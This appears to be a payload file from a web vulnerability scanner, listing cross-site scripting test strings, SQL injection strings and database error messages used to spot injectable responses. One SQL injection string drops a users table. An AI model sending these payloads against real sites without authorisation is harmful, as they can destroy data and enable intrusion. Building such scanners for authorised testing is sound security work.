# scanner/payloads.py

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "'; DROP TABLE users;--"
]

SQL_ERROR_PATTERNS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "SQL syntax",
    "ORA-01756",
    "Unclosed quotation mark after the character string",
    "Microsoft OLE DB Provider for SQL Server"
]
